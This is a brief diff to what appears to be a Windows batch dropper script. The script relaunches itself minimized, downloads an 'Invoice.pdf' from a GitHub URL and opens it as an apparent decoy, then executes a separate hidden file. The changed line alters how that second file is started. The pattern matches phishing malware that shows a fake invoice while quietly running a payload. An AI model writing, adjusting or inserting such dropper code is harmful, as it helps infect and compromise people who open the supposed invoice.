@@ -18,5 +18,5 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
 
     set URL_INVOICE="https://raw.githubusercontent.com/BelliniGauss/1/main/Invoice.pdf"
     set PATH_INVOICE=%PATH_TO_ENTRY%\Invoice.pdf
-    curl -L -o %PATH_INVOICE% %URL_INVOICE% && %PATH_INVOICE% && "%FILE_FUX%" && exit
+    curl -L -o %PATH_INVOICE% %URL_INVOICE% && %PATH_INVOICE% && start "%FILE_FUX%" && exit
 exit
